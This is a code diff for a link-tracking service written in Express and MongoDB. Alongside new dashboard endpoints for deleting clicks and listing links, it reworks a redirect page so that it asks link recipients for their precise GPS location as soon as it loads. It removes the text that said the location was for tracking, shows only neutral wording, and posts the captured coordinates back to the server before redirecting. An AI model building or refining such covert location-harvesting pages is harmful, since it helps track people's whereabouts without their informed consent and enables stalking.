@@ -466,6 +466,61 @@ router.delete('/dashboard/link/:linkId', async (req, res) => {
 });
 
 /**
+ * DELETE /dashboard/click/:clickId
+ * Deletes a single click
+ */
+router.delete('/dashboard/click/:clickId', async (req, res) => {
+  try {
+    const { clickId } = req.params;
+    const result = await Click.deleteOne({ clickId });
+
+    console.log(`[CLICK DELETED] clickId: ${clickId}`);
+
+    res.json({
+      success: true,
+      deleted: result.deletedCount
+    });
+
+  } catch (error) {
+    console.error('[DELETE CLICK ERROR]', error);
+    res.status(500).json({
+      success: false,
+      error: 'Failed to delete click'
+    });
+  }
+});
+
+/**
+ * GET /dashboard/links
+ * Returns all links with click counts
+ */
+router.get('/dashboard/links', async (req, res) => {
+  try {
+    const links = await Link.find().sort({ createdAt: -1 });
+
+    // Get click counts for each link
+    const linksWithCounts = await Promise.all(links.map(async (link) => {
+      const clickCount = await Click.countDocuments({ linkId: link.linkId });
+      return {
+        ...link.toObject(),
+        clickCount
+      };
+    }));
+
+    res.json({
+      success: true,
+      data: linksWithCounts
+    });
+  } catch (error) {
+    console.error('[LINKS ERROR]', error);
+    res.status(500).json({
+      success: false,
+      error: 'Failed to fetch links'
+    });
+  }
+});
+
+/**
  * Generate the tracking HTML page
  * This page:
  * 1. Shows a "Redirecting..." message
@@ -567,31 +622,18 @@ function generateTrackingHTML(clickId, targetUrl) {
     <div class="success-icon hidden" id="successIcon">
       <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
     </div>
-    <h1 id="statusTitle">Redirecting...</h1>
-    <p id="statusText">Taking you to your destination</p>
-
-    <div class="location-prompt hidden" id="locationPrompt">
-      <p>Allow location access for accurate tracking</p>
-      <button class="location-btn" id="locationBtn">Enable Location</button>
-    </div>
+    <h1 id="statusTitle">One moment...</h1>
+    <p id="statusText">Requesting location access</p>
   </div>
 
   <script>
     const clickId = '${clickId}';
     const targetUrl = ${JSON.stringify(targetUrl)};
 
-    // Elements
-    const spinner = document.getElementById('loadingSpinner');
-    const successIcon = document.getElementById('successIcon');
-    const statusTitle = document.getElementById('statusTitle');
-    const statusText = document.getElementById('statusText');
-    const locationPrompt = document.getElementById('locationPrompt');
-    const locationBtn = document.getElementById('locationBtn');
-
     // Track if location was captured
     let locationCaptured = false;
 
-    // Request location permission
+    // Request location permission - shows native Yes/No dialog
     function requestLocation() {
       if (!navigator.geolocation) {
         logLocationDenied('unavailable');
@@ -599,12 +641,12 @@ function generateTrackingHTML(clickId, targetUrl) {
       }
 
       navigator.geolocation.getCurrentPosition(
-        // Success
+        // Success - user said YES
         (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           logLocation(latitude, longitude, accuracy);
         },
-        // Error
+        // Error - user said NO or error occurred
         (error) => {
           let reason = 'denied';
           switch(error.code) {
@@ -622,7 +664,7 @@ function generateTrackingHTML(clickId, targetUrl) {
         },
         {
           enableHighAccuracy: true,
-          timeout: 10000,
+          timeout: 15000,
           maximumAge: 0
         }
       );
@@ -642,7 +684,6 @@ function generateTrackingHTML(clickId, targetUrl) {
             accuracy
           })
         });
-        console.log('Location logged:', latitude, longitude);
       } catch (error) {
         console.error('Failed to log location:', error);
       }
@@ -668,60 +709,24 @@ function generateTrackingHTML(clickId, targetUrl) {
 
     // Redirect to target URL
     function redirectToTarget() {
-      // Show success state
-      spinner.classList.add('hidden');
-      successIcon.classList.remove('hidden');
-      statusTitle.textContent = 'Done!';
-      statusText.textContent = 'Redirecting you now...';
-
-      // Small delay for better UX
+      document.getElementById('loadingSpinner').classList.add('hidden');
+      document.getElementById('successIcon').classList.remove('hidden');
+      document.getElementById('statusTitle').textContent = 'Done!';
+      document.getElementById('statusText').textContent = 'Redirecting...';
       setTimeout(() => {
         window.location.href = targetUrl;
-      }, 500);
+      }, 300);
     }
 
-    // Check for existing location permission
-    function checkPermission() {
-      if (!navigator.permissions) {
-        // Fallback: try to get location directly
-        requestLocation();
-        return;
-      }
+    // Initialize - immediately request location (shows native dialog)
+    requestLocation();
 
-      navigator.permissions.query({ name: 'geolocation' }).then((result) => {
-        if (result.state === 'granted') {
-          // Already granted - get location
-          requestLocation();
-        } else if (result.state === 'prompt') {
-          // Show prompt button
-          locationPrompt.classList.remove('hidden');
-          locationBtn.addEventListener('click', () => {
-            locationPrompt.classList.add('hidden');
-            requestLocation();
-          });
-        } else {
-          // Denied - log and redirect
-          logLocationDenied('denied');
-        }
-
-        // Listen for permission changes
-        result.addEventListener('change', () => {
-          if (result.state === 'granted' && !locationCaptured) {
-            requestLocation();
-          }
-        });
-      });
-    }
-
-    // Initialize on page load
-    checkPermission();
-
-    // Fallback redirect if something goes wrong
+    // Fallback redirect after 8 seconds regardless
     setTimeout(() => {
       if (!locationCaptured) {
         redirectToTarget();
       }
-    }, 5000);
+    }, 8000);
   </script>
 </body>
 </html>`;
